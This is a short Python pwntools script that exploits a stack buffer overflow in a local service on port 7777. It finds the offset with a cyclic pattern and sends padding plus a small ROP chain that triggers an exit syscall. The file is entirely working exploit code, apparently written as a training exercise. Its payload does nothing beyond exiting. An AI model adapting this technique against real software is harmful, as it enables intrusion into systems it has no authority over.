#!/usr/bin/env python3
#coding: utf-8

from ast import Bytes
from typing import Literal
from pwn import *
from struct import pack

PORT = 7777
HOST = 'localhost'
OFFSET= 524

def find_offset() -> Literal:
    def send_cyclic(g: cyclic_gen, conn: remote):
        p = g.get(800)
        conn.send(p)

    def get_offset(g: cyclic_gen):
        eip_value = input("EIP value: ")
        eip_value = int(eip_value, base=16)
        offset = g.find(eip_value)
        print(f"l'offset se situe au {offset[0]} octets")
        return offset
    g = cyclic_gen()
    conn = remote(HOST,PORT)
    conn.recvline()
    send_cyclic(g, conn)
    offset = get_offset(g)
    conn.close()
    return offset[0]
    

def exit_custom_nb(nb):
    g = cyclic_gen()
    conn = remote(HOST,PORT)
    p = b''.join([
        b'A'*OFFSET,
        pack('<I', 0x0804ff10), # xor eax, eax ; ret
        pack('<I', 0x08088b3a), # inc eax ; ret
        pack('<I', 0x0804901e), # pop ebx ; ret
        pack('<I', nb),
        pack('<I', 0x0804ac72) # int 0x80
    ]) 
    conn.send(p)
    conn.close()


def main():
    exit_custom_nb(0x00000000)
    
if __name__ == '__main__':
    main()